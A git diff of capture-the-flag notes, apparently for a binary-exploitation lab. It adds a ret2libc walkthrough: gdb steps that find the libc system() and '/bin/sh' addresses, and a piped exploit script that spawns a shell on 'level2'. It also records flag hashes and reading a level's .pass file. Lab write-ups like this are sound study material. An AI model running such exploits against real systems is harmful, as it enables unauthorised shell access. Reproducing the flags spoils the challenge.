@@ -12,6 +12,7 @@ if (iVar1 == 0x1a7)
 ## flag : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
 
 # Flag 1
+export PATH=/tmp/Python-3.6.15:$PATH
 
 void main(void)
 
@@ -46,4 +47,28 @@ cat /home/user/level2/.pass
 
 
 ## flag : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+# flag 02
+
+ret2libc to bypass the return address overwrite protection
+
+gdb
+b main
+r
+p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+info proc -> adresse libc = 0xb7e2c000
+find 0xb7e2c000, +99999999, "/bin/sh" -> trouve la string /bin/sh dans la libc pour l'utiliser avec system
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+x/s 0xb7f8cc58
+0xb7f8cc58:      "/bin/sh"
+
+(python3 exploit.py; cat) | ./level2
+
+## flag : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+# flag 03
+
+
 
